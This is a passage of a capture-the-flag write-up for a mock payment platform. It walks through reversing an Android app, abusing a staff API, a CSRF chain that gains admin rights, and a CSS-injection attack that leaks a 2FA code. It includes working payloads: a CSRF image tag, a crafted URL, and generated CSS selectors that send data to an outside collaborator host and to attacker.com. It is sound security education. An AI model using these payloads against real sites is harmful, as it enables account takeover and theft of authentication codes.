  AnonymousClass5 r17 = r0;
  DatabaseReference databaseReference = this.childRefThree;
  byte[] bArr = decodeSecondParam;
  final String str = firstParam;
  byte[] bArr2 = decodeFirstParam;
  final String str2 = secondParam;
  String str3 = secondParam;
  final String secondParam2 = thirdParam;
  String str4 = firstParam;
  final EditText editText2 = editText;
  Uri uri = data;
  final Button button2 = button;
  AnonymousClass5 r0 = new ValueEventListener() {
    public void onDataChange(DataSnapshot dataSnapshot) {
      String str;
      String value = (String) dataSnapshot.getValue();
      if (str != null && decodedFirstParam.equals("PartThreeActivity") &&
        str2 != null && decodedSecondParam.equals("on") &&
        (str = secondParam2) != null) {
        if (str.equals("X-" + value)) {
          editText2.setVisibility(0);
          button2.setVisibility(0);
          PartThreeActivity.this.thread.start();
        }
      }
    }

    public void onCancelled(DatabaseError databaseError) {
      Log.e("TAG", "onCancelled", databaseError.toException());
    }
  };
  databaseReference.addListenerForSingleValueEvent(r0);
}
```

Now that we know all the requirement we can send the intent.

```
adb shell am start -W -a android.intent.action.VIEW \
-d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24\=\&header=X-Token" bounty.pay
```

We are then asked to provide a "leaked hash".

![](<h12006-ctf-writeup/Screenshot 2020-06-03 at 22.52.38.png>)

Looking into the logs using `abd logcat` we can quickly see our leaked hash:

```
adb logcat | grep IS:
05-31 20:32:30.618  5199  6360 D HOST IS: : http://api.bountypay.h1ctf.com
05-31 20:32:30.618  5199  6360 D TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1
```

When submitted we get the Congrats activity 🥳

![CongratsActivity](<h12006-ctf-writeup/Screenshot 2020-06-03 at 22.24.57.png>)

## Know your staff

### Getting an account on staff.bountypay

We ommitted some things when doing the reconnaiscance, to make the report more readable, that we now need since we don't know what to do with the token that we got from reversing the APK.

The most interesting thing is that there is a staff endpoint on the api which throws an error saying `Missing or invalid Token`:

```
http get https://api.bountypay.h1ctf.com/api/staff
```

```HTTP
HTTP/1.1 401 Unauthorized
Connection: keep-alive
Content-Type: application/json
Date: Thu, 04 Jun 2020 19:50:18 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

[
    "Missing or invalid Token"
]
```

Let's see what happens when we send the token that we got from reversing the apk:

```
http get https://api.bountypay.h1ctf.com/api/staff \
X-Token:8e9998ee3137ca9ade8f372739f062c1
HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: application/json
Date: Wed, 03 Jun 2020 20:37:41 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

[
    {
        "name": "Sam Jenkins",
        "staff_id": "STF:84DJKEIP38"
    },
    {
        "name": "Brian Oliver",
        "staff_id": "STF:KE624RQ2T9"
    }
]
```

The endpoint now returns two accounts. Something I did not notice at first is that the same endpoint also answers to POST requests. This can be explained since in part II, I limited my recon to enumerating directories and files using GET requests. Something to keep in mind when working with APIs, always test the different HTTP methods 😉

```
http post https://api.bountypay.h1ctf.com/api/staff \
X-Token:8e9998ee3137ca9ade8f372739f062c1
```

```HTTP
HTTP/1.1 400 Bad Request
Connection: keep-alive
Content-Type: application/json
Date: Wed, 03 Jun 2020 21:21:15 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

[
    "Missing Parameter"
]
```

With the POST method we get a different error message "Missing Parameter". The logical thing to do is to try the parameters that we saw in the GET request (`name` and `staff_id`). When we send the parameter `staff_id` with a dummy value we get an error message "Invalid Staff ID".

```
http -f post https://api.bountypay.h1ctf.com/api/staff \
X-Token:8e9998ee3137ca9ade8f372739f062c1 \
staff_id=a
```

```HTTP
HTTP/1.1 404 Not Found
Connection: keep-alive
Content-Type: application/json
Date: Wed, 03 Jun 2020 21:22:44 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

[
    "Invalid Staff ID"
]
```

If we try set to value of `staff_id` to the value associated with Sam Jenkins or Brian Oliver we get an error saying "Staff Member has an account", which makes sense since this endpoint is probably used to create a new staff account.

```
http -f post https://api.bountypay.h1ctf.com/api/staff \
X-Token:8e9998ee3137ca9ade8f372739f062c1 \
staff_id=STF:KE624RQ2T9
```

```HTTP
HTTP/1.1 409 Conflict
Connection: keep-alive
Content-Type: application/json
Date: Wed, 03 Jun 2020 21:25:07 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

[
    "Staff Member already has an account"
]
```

Now you might remember that in in the reconnaissance phase we found the `staff_id` of a new employee named Sandra. Let's see what happens when we send this `staff_id:`

```
http -f post https://api.bountypay.h1ctf.com/api/staff \
X-Token:8e9998ee3137ca9ade8f372739f062c1 \
staff_id=STF:8FJ3KFISL3
```

```HTTP
HTTP/1.1 201 Created
Connection: keep-alive
Content-Type: application/json
Date: Wed, 03 Jun 2020 21:28:01 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

{
    "description": "Staff Member Account Created",
    "password": "s%3D8qB8zEpMnc*xsz7Yp5",
    "username": "sandra.allison"
}
```

Nice we now have an account for the Staff application !

### Getting Mårten Mickos account

Once we are logged in we can see 4 differents tabs:

* Home
* Support Tickets
* Profile
* Logout

![Homepage](<h12006-ctf-writeup/Screenshot 2020-06-03 at 23.33.11.png>)

There is only 1 ticket named "Welcome to BountyPay" from Admin to Sandra:

![Support Tickets](<h12006-ctf-writeup/Screenshot 2020-06-03 at 23.33.29.png>)

There are not action possible on this screen since it appears that replies are currently disabled. Looking at the source code of the page, there is no reference to any endpoint that we could use to send a reply.

![Ticket 3582](<h12006-ctf-writeup/Screenshot 2020-06-03 at 23.33.55.png>)

On the profile page there are two settings that we can update, the profile name and the avatar.

![Profile](<h12006-ctf-writeup/Screenshot 2020-06-03 at 23.34.19.png>)

There is also a feature that is a bit hidden in the footer that allow us to report a page to the admins with a comment saying that the admin directory will be ignored.

![Report Page](<h12006-ctf-writeup/Screenshot 2020-06-03 at 23.34.59.png>)

The last interesting thing is a bit of JavaScript:

```javascript title="/js/website.js"
$(".upgradeToAdmin").click(function() {
  let t = $('input[name="username"]').val();
  $.get("/admin/upgrade?username=" + t, function() {
    alert("User Upgraded to Admin")
  })
});

$(".tab").click(function() {
  return $(".tab").removeClass("active"), 
  $(this).addClass("active"), 
  $("div.content").addClass("hidden"), 
  $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}); 

$(".sendReport").click(function() {
  $.get("/admin/report?url=" + url, function() {
    alert("Report sent to admin team")
  }), $("#myModal").modal("hide")
});

document.location.hash.length > 0 &&
("#tab1" === document.location.hash &&
  $(".tab1").trigger("click"), "#tab2" === document.location.hash &&
  $(".tab2").trigger("click"), "#tab3" === document.location.hash &&
  $(".tab3").trigger("click"), "#tab4" === document.location.hash &&
  $(".tab4").trigger("click")
);
```

In this JavaScript file we can see multiple things:

* There is an `/admin/upgrade` endpoint which will use the value of an input with the name username as the username
* Clicking on an element with the `sendReport` class will trigger a GET request to the `/admin/report?url=`
* Based on the hash present in the URL, a click will be simulated to go directly to the right tab

Let's start investigating the upgrade endpoint since this our goal is probably to get an admin account. Of course simply requesting the endpoint would be too easy and we get an error if we try to do so :(

```
http get https://staff.bountypay.h1ctf.com/admin/upgrade
```

```HTTP
HTTP/1.1 401 Unauthorized
Connection: keep-alive
Content-Type: application/json
Date: Fri, 05 Jun 2020 17:24:01 GMT
Server: nginx/1.14.0 (Ubuntu)
Transfer-Encoding: chunked

[
    "Only admins can perform this"
]
```

At this point it appears that we will need to find a way to trick an admin users into upgrading our account. Let's see if we can find a way to perform a Cross-Site Request Forgery (CSRF) attack. Since the method used to upgrade the account is GET (don't do that) we don't need a Cross-Site Scripting (XSS) and being able to inject an image would be sufficient:

```html
<img src="/admin/upgrade?username=sandra.allison" />
```

The profile page appears to be our best candidate to find such a vulnerability since:

* We cannot use the report feature here as the `/admin` directory is ignored
* The ticket page does not provide us with a way to send a reply

Let's look at the request used to update our profile name:

```
http -f post "https://staff.bountypay.h1ctf.com/?template=home" \
Cookie:'token=c0...' \
profile_name=%3Cs%3Esandra%3C%2Fs%3E
```

Here I'm trying to inject the followin payload: `<s>sandra</s>` but we can see that all special characters are filtered both on the profile page and on the tickets page.

![](<h12006-ctf-writeup/Screenshot 2020-06-05 at 21.19.55.png>)

The request to change our avatar is working in a similar fashion. There are only three avatars available and when you switch the value `avartar1`, `avatar2` or `avatar3` is sent.

```
http -f post "https://staff.bountypay.h1ctf.com/?template=home" \
Cookie:'token=c0...' \
profile_name=ssandras \
profile_avatar=avatar3
```

The value is then used to set a different background image for the div using CSS:

```html
<div class="col-md-12 text-center">
  <div style="margin:auto" class="avatar avatar3"></div>
</div>
```

```css
.avatar1 {
    background-image:url("data:image/png;base64,iVB...=");
}

.avatar2 {
    background-image:url("data:image/png;base64,iVB...=");
}

.avatar3 {
    background-image:url("data:image/png;base64,iVB...=");
}
```

Something interesting is that even though, like for our profile name special characters are stripped, we can still use this to set an arbitrary class (or multiple, the space character is allowed) on the div.

At first, it looks like that we might be able to set our avatar to `upgradeToAdmin` and if we can trick an admin into clicking our avatar then we will be admin but there are a couple of issues:

* We need to find a page where our avatar will be displayed (this cannot be the profile page since this will not be our avatar that is displayed)
* We should get rid of the click requirements (since this is a CTF we cannot expect that a human will manually click on our avatar)
* We need in input in the page with `username` as its name

The first requirement is easy, the ticket page `?template=ticket&ticket_id=3582` will display our avatar to anyone who clicks on it. The second one is doable since we can set the `tab3` class on the avatar as well as set it as a hash in the link we will send to the admin using the report url.

So far our avatar is set to  `tab3 upgradeToAdmin` and the link we need to report looks like this:

```
/?template=ticket&ticket_id=3582#tab3
```

At this point the third requirement looks impossible since the only place where there is an input with a name of `username` is the login page. The good news is that we can set the value of the field by passing the username as a get parameter.

```
?template=login&username=test
```

Great ! If only we could load both template at the same time... Maybe if we can send multiple values for the template param ?

The same way there is no concensus over how objects should be represented in query parameters, there is no standardized way to format arrays of values in query parameters. Here are some ways to do it:

```
?foo=bar&foo=qux
?foo[]=bar&foo[]=qux
?foo=bar,qux
```

Luckily for us, repeating the parameter along with empty square brackets did the trick ! Our final payload looks like this:

```
/?template[]=login&template[]=ticket&username=sandra.allison&ticket_id=3582#tab3
```

!!! warning
    If you try to use this URL and then use the report page feature this will not work. The hash part `#tab3` will not be sent. You will need to encode it manually.

When we submit it using the report page feature we get back an updated cookie which let us acces the admin tab revealing the credentials of Marten Mickos !

![Admin](<h12006-ctf-writeup/Screenshot 2020-06-04 at 09.33.42.png>)

!!! info
    Something I have not mentioned is that for this part, every information (profile name and avatar) was actually stored in the cookie and there was no data persistance which might be confusing since this means that this attack could not work. Indeed the admin would have a different cookie without our information. Since everything was pointing in the same direction I tought this was probably simulated and that we could ignore it. This was later confirmed to me by [@adamtlangley](https://twitter.com/adamtlangley) the creator of the challenge.

## You will pay for this !

Once we are logged in using Mårten Mickos credentials we can finally see some transactions to process for the month of may.

![](<h12006-ctf-writeup/Screenshot 2020-06-04 at 09.52.31.png>)

Sadly clicking on pay does not show us the final flag but a new 2FA screen that cannot be as easily bypassed as the first one...

![](<h12006-ctf-writeup/Screenshot 2020-06-04 at 09.52.59.png>)

Let's look at the request:

```HTTP
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36 autochrome/purple
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

Something stands out here, there is an `app_style` parameter containing the URL of a CSS file: https://www.bountypay.h1ctf.com/css/uni\_2fa\_style.css

```css
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
```

... and we only have 2 minutes to send the 2FA code.

![](<h12006-ctf-writeup/Screenshot 2020-06-04 at 09.53.26.png>)

In the response we can see that the max length of the 2FA is seven characters:

```html
<input name="challenge_answer" class="form-control" maxlength="7">
```

The idea here, while not really realist, is that the CSS file that is sent, is then included in the page that the 2FA app is using to generate the 2FA code. If this is true, this means that we will probably need to use a CSS injection attack to leak the 2FA code. We can confirm this by sending the request with an `app_style` that point to a server in our control. For this, I used [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator):

```HTTP
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 75
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36 autochrome/purple
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2F0stbry4if5vk4bspeq59bh6zoqugi5.burpcollaborator.net
```

The request was received from IP address 3.21.98.146, the same IP used by all the applications.

```HTTP
GET / HTTP/1.1
Host: 0stbry4if5vk4bspeq59bh6zoqugi5.burpcollaborator.net
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36
Accept: text/css,*/*;q=0.1
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: style
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
```

The User-Agent tells us that the browser used is [HeadlessChrome](https://developers.google.com/web/updates/2017/04/headless-chrome) which is common in CTF. At this point, I had some idea on how to proceed since I knew you could [exfiltrate data using CSS](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d) but there was something I was missing.

The general CSS injection data exfiltration method is to use CSS like:

```css
/* https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d */
input[name=csrf][value^=a]{
    background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
    background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
    background-image: url(https://attacker.com/exfil/9);   
}
```

Then, `attacker.com` would load an iframe with this css injection on it on `target.com` . `attacker.com` would then wait for a request to `https://attacker.com/exfil/<data>`. The iframe trick is useful since we can guess one character at a time.

In our case, we cannot do this since there is no way to iframe the app. The thing is, bruteforcing a 7 character 2FA code is not doable if the alphabet is a-zA-Z0-9 since this represent 1,028,071,702,528 combinations.

After some [trials and errors](https://gist.github.com/Techbrunch/82c3691e20a6c754a4f16e93d752cc3e/revisions) I realized that there are actually 7 inputs in the page, one for each character ! This makes the challenge way easier since this requires 364 (52\*7) combinations only !&#x20;

I wrote a small Ruby script to generate all the combinations:

```ruby
(1..7).to_a.each do |ct|
	(('a'..'z').to_a + ('0'..'9').to_a).each do |char|
		puts "input:nth-child(#{ct})[value^=\"#{char}\"] {background:url(\"http://#{ct}-#{char}.lwl3lz48tr50o2qlajeftgkff6lx9m.burpcollaborator.net\");}"
	end

	('A'..'Z').to_a.each do |char|
		puts "input:nth-child(#{ct})[value^=\"#{char}\"] {background:url(\"http://#{ct}-m#{char}.lwl3lz48tr50o2qlajeftgkff6lx9m.burpcollaborator.net\");}"
	end
end
```

!!! info
    We are using [nth-child()](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-child) to matches the inputs element based on their position since the first character should be the first input.

The output looks like this:

```css
input:nth-child(6)[value^="a"] {background:url("http://1-a.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net");}
/* ... */
input:nth-child(6)[value^="z"] {background:url("http://6-z.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net");}
input:nth-child(6)[value^="0"] {background:url("http://6-0.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net");}
/* ... */
input:nth-child(6)[value^="9"] {background:url("http://6-9.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net");}
input:nth-child(6)[value^="A"] {background:url("http://6-mA.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net");}
/* ... */
input:nth-child(6)[value^="Z"] {background:url("http://6-mZ.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net");}
```

To host the final payload I used [GitHub Gist](https://gist.github.com/) and [raw.githack.com](https://raw.githack.com/) to set the proper `Content-Type` headers:

```
app_style=<@urlencode_5>https://gist.githack.com/Techbrunch/82c3691e20a6c754a4f16e93d752cc3e/raw/837efa256058fc642443b7c59e81c7827d4a1ff4/h12006.css<@/urlencode_5>
```

This is how it looks like in Burp after we submit our payload (here I'm using [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f)):

![](<h12006-ctf-writeup/Screenshot 2020-06-04 at 09.21.23.png>)

Based on the requests made to the collaborator we can easily extract the 2FA code.

```
1-mt.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
2-mv.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
3-u.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
4-7.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
5-my.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
6-1.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
7-mw.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
```

For this request, the 2FA code is `TVu7Y1W` , once submitted we get the final FLAG !

![](<h12006-ctf-writeup/Screenshot 2020-06-06 at 00.03.06.png>)

I hope you enjoyed reading this writeup, if so you can follow me on Twitter at [@TechbrunchFR](https://twitter.com/TechBrunchFR).
